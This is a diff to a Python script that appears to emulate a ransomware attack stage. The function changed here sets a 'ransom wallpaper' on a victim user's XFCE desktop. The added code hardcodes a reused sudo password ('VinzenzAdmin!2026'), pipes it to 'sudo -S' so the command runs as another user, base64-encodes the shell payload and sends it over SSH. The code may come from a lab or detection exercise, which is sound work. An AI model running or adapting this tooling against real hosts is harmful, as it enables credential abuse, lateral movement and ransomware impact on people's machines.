@@ -730,19 +730,19 @@ def _phase5_set_ransom_wallpaper(vinzenz_beacon: str) -> bool:
 
     # Set wallpaper as john.stravidis (DISPLAY=:1). Read DBUS address from
     # the live xfce4-session process env; fall back to the XDG socket path.
+    # vinzenz.fedora has sudo on john_ws (same password, cross-fleet design).
     wallpaper_script = (
-        "JOHN_UID=$(id -u john.stravidis); "
-        "DBUS_ADDR=$(cat /proc/$(pgrep -u john.stravidis -x xfce4-session 2>/dev/null"
-        " | head -1)/environ 2>/dev/null | tr '\\0' '\\n'"
-        " | grep ^DBUS_SESSION_BUS_ADDRESS= | cut -d= -f2-); "
+        "JOHN_UID=$(id -u john.stravidis 2>/dev/null); "
+        "SESS_PID=$(pgrep -u john.stravidis -x xfce4-session 2>/dev/null | head -1); "
+        "DBUS_ADDR=$(cat /proc/${SESS_PID}/environ 2>/dev/null "
+        "| tr '\\0' '\\n' | grep ^DBUS_SESSION_BUS_ADDRESS= | cut -d= -f2-); "
         '[ -z "$DBUS_ADDR" ] && DBUS_ADDR="unix:path=/run/user/${JOHN_UID}/bus"; '
-        f"runuser -u john.stravidis -- env DISPLAY=:1 "
-        f'DBUS_SESSION_BUS_ADDRESS="$DBUS_ADDR" '
+        "echo 'VinzenzAdmin!2026' | sudo -S -u john.stravidis -- "
+        f'env DISPLAY=:1 DBUS_SESSION_BUS_ADDRESS="$DBUS_ADDR" '
         f"xfconf-query -c xfce4-desktop "
         f"-p /backdrop/screen0/monitor0/workspace0/last-image "
-        f"-s {WALLPAPER_REMOTE} 2>/dev/null || true; "
-        "pkill -USR1 -u john.stravidis xfdesktop 2>/dev/null || true; "
-        "echo WALLPAPER_OK"
+        f"-s {WALLPAPER_REMOTE} 2>/dev/null "
+        "&& echo WALLPAPER_OK || echo WALLPAPER_FAILED"
     )
     b64_wp = base64.b64encode(wallpaper_script.encode()).decode()
     ssh_cmd = (
